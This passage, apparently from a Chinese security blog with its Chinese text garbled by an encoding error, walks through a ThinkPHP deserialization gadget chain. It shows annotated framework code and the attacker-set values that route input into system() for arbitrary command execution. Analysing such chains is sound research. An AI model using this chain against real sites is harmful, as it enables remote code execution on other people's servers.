$this-&gt;error</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp;  <span class="comment">// $this-&gt;parent æŒ‡å‘ Output å¯¹è±¡ï¼Œä¸ä¸ºç©º</span></span><br><span class="line">        <span class="comment">// $this-&gt;error æŒ‡å‘çš„ HasOne çš„ selfRelation ä¸º false</span></span><br><span class="line">        !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; </span><br><span class="line">        <span class="comment">// $this-&gt;error-&gt;query-&gt;model æŒ‡å‘ Output å¯¹è±¡</span></span><br><span class="line">        <span class="comment">// ä¸ $this-&gt;parent æŒ‡å‘çš„å¯¹è±¡çš„ç±»ç›¸åŒ</span></span><br><span class="line">        <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)) &#123; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>; <span class="comment">// è¿”å› $this-&gt;parent</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡ä¼ªé€  &#96;&#96;Pivot-&gt;parent<code>æŒ‡å‘çš„</code>think\console\Output<code> å¯¹è±¡ï¼ˆ</code>styles<code>è®¾ç½®ä¸º</code>[â€œgetAttrâ€]<code>ï¼‰ï¼Œçš„ </code>Output-&gt;__call<code>æ–¹æ³•å¯ä»¥å½¢æˆå¦‚ä¸‹è°ƒç”¨é“¾ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°</code>$this-&gt;handle-&gt;write&#96; æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// method = &quot;getAttr&quot;, $args = [&quot;no&quot;]</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this å³ Pivot-&gt;parent (Output å¯¹è±¡) çš„ styles æ•°ç»„å¯æ§ï¼Œè¿™é‡Œè®¾ç½®ä¸º [&quot;getAttr&quot;]</span></span><br><span class="line">    <span class="comment">// $method æ˜¯å‰é¢è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³• &quot;getAttr&quot;</span></span><br><span class="line">    <span class="comment">// å› æ­¤è¿›å…¥ if åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        <span class="comment">// å°† $method æ’å…¥åˆ° $args æ•°ç»„ç¬¬ä¸€é¡¹ï¼Œ å³ $args = [&quot;getAttr&quot;, &quot;no&quot;]</span></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="comment">//è°ƒç”¨ $this-&gt;block æ–¹æ³•ï¼Œå‚æ•°æ˜¯ [&quot;getAttr&quot;, &quot;no&quot;]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $style = &quot;getAttr&quot;, $message = &quot;no&quot;</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * è¾“å‡ºä¿¡æ¯å¹¶æ¢è¡Œ</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $messages = &quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL(0)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $messages = &quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool   $newline = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL(0)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>$this-&gt;handle</code> è¢«è®¾ç½®ä¸º <code>think\session\driver\Memcached</code> å¯¹è±¡ã€‚è€Œ <code>Memcached-&gt;write</code> å‡½æ•°å®ç°å¦‚ä¸‹ã€‚å…¶ä¸­ <code>Memcached-&gt;handler</code> è¢«è®¾ç½®ä¸º <code>think\cache\driver\Memcache</code> å¯¹è±¡ï¼Œå› æ­¤ä¼šè°ƒç”¨åˆ° è¯¥å¯¹è±¡çš„ <code>set</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">config = [</span><br><span class="line">    <span class="string">&quot;session_name&quot;</span> =&gt; <span class="string">&quot;HEXENS&quot;</span></span><br><span class="line">    <span class="string">&quot;expire&quot;</span> =&gt; <span class="number">3600</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥Session</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $sessID = &quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> String $sessData = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å‚æ•°ä¸º &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;, true, 3600</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>think\cache\driver\Memcache</code> å¯¹è±¡ä¸­æœ‰å¦‚ä¸‹è°ƒç”¨é“¾ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° <code>think\Request-&gt;get</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string            $name ç¼“å­˜å˜é‡å = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed             $value  å­˜å‚¨æ•°æ® = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer|\DateTime $expire  æœ‰æ•ˆæ—¶é—´ï¼ˆç§’ï¼‰= 3600</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $expire ä¸ä¸ºç©ºï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $expire æ˜¯æ•°å­—ä¸æ˜¯ DateTime çš„å®ä¾‹ï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; <span class="comment">// $this-&gt;tag è®¾ç½®ä¸º true</span></span><br><span class="line">        !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) &#123; <span class="comment">// è°ƒç”¨åˆ° $this-&gt;hasï¼Œå‚æ•°ä¸º &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ¤æ–­ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name ç¼“å­˜å˜é‡å = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;getCacheKey è¿”å› $this-&gt;options[&#x27;prefix&#x27;] . $name</span></span><br><span class="line">    <span class="comment">// å…¶ä¸­ $this-&gt;options[&#x27;prefix&#x27;] è¢«è®¾ç½®ä¸º &quot;&quot;</span></span><br><span class="line">    <span class="comment">// å› æ­¤ $key = $name = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">    <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $this-&gt;handler è¢«è®¾ç½®ä¸º think\Request</span></span><br><span class="line">    <span class="comment">// å› æ­¤ä¼šè°ƒç”¨ Request-&gt;get æ–¹æ³•ï¼Œå‚æ•°ä¸º $key = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> !== <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\Request-&gt;get</code> å‡½æ•°è¿›ä¸€æ­¥ä¼šè°ƒç”¨ <code>think\Request-&gt;input</code> å‡½æ•°ï¼Œå¹¶ä¼ å…¥ <code>$this-&gt;get = [&#39;HEXENS&lt;getAttr&gt;no&lt;&#39; =&gt; &#39;calc&#39;]</code> å‚æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¾ç½®è·å–GETå‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $name    å˜é‡å = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed        $default é»˜è®¤å€¼ = null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $filter  è¿‡æ»¤æ–¹æ³• = &quot;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;get = [&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27; =&gt; &#x27;calc&#x27;]ï¼Œéç©ºä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $name æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯æ•°ç»„ï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\Request-&gt;input</code> å‡½æ•°</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// is_null åˆ¤æ–­ $filter === null</span></span><br><span class="line">    <span class="comment">// ç”±äº $filter = &#x27;&#x27;ï¼Œå› æ­¤è¿›å…¥ else åˆ†æ”¯</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// $filter ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå› æ­¤è®¾ç½® $filter = $this-&gt;filter = &quot;system&quot;</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨ $filter æœ«å°¾è¿½åŠ ä¸€ä¸ª $defatlt(null)</span></span><br><span class="line">    <span class="comment">// æ­¤æ—¶ $filter = [&#x27;system&#x27;, null] </span></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å˜é‡ æ”¯æŒè¿‡æ»¤å’Œé»˜è®¤å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array        $data    æ•°æ®æº = [&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27; =&gt; &#x27;calc&#x27;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|false $name    å­—æ®µå = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed        $default é»˜è®¤å€¼ = null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $filter  è¿‡æ»¤å‡½æ•° = &quot;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// è§£æ $name = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// æŒ‰ &#x27;/&#x27; åˆ†å‰² $name å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="comment">// $name = &quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span></span><br><span class="line">            <span class="comment">// $type = &quot;getAttr&gt;&quot;</span></span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å°† $name æŒ‰ . æ‹†åˆ†æˆå¤šç»´æ•°ç»„è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œåªæ‹†å‡ºä¸€é¡¹ &quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                <span class="comment">// ä» $data ä¸­å–å‡ºè¦æ‰§è¡Œçš„å‘½ä»¤èµ‹å€¼ç»™ $data</span></span><br><span class="line">                <span class="comment">// $data = [&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27; =&gt; &#x27;calc&#x27;][&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27;] = &#x27;calc&#x27;</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// $data æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯å¯¹è±¡ï¼Œå› æ­¤ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œå› ä¸º $fileter = &quot;&quot; ä¸” $default = null</span></span><br><span class="line">    <span class="comment">// å› æ­¤åœ¨ getFilter å‡½æ•°ç»è¿‡ä¸€ç³»åˆ—åˆ¤æ–­ä¹‹åè¿”å› [$this-&gt;fileter, null]</span></span><br><span class="line">    <span class="comment">// å³ [&quot;system&quot;, null]</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $data æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œä¸æ˜¯æ•°ç»„</span></span><br><span class="line">    <span class="comment">// å› æ­¤è¿›å…¥ else åˆ†æ”¯è°ƒç”¨ filterValue å‡½æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\Request-&gt;filterValue</code> å‡½æ•°å…ˆæ˜¯ä» <code>$filters</code> ä¸­ç§»é™¤æœ€åä¸€é¡¹ <code>null</code>ï¼Œä¹‹åéå† <code>$filters</code> æ•°ç»„ä¾æ¬¡è°ƒç”¨é‡Œé¢çš„å‡½æ•°å¹¶ä¸”å‚æ•°ä¸º <code>$value</code>ã€‚ç”±äºå‡½æ•°å’Œå‚æ•°éƒ½å¯æ§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è°ƒç”¨ <code>system</code> å‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
